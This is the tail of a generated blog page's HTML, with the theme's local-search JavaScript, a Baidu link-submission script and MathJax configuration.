                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
